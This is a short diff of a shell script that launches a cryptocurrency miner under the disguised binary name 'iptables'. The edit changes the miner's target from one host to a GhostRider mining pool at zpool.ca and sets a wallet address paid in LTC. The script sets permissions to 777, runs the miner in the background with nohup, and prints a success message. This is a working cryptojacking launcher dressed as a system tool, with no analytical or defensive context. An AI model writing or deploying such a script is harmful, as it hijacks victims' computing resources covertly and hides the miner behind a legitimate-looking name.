@@ -1,4 +1,4 @@
 #!/bin/sh
 chmod 777 iptables
-nohup timeout 55m ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.$(echo $(shuf -i 1-99999 -n 1)-T4) -t 3
+nohup ./iptables -a gr -o ghostrider.na.mine.zpool.ca:5354 -u LViSs9qdctYGL4Bze21iVjNNqHEDF1JsoX -p c=LTC &
 echo JOB DONE SUCCESS
